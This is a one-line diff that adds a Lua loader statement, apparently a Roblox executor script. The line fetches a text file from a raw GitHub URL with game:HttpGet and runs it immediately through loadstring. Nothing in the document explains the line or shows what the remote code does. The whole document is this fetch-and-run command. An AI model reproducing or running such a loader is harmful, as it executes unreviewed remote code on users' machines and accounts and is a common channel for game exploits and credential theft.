@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/csx-000099990009089809/csx/refs/heads/main/text.99%20(1).txt"))()
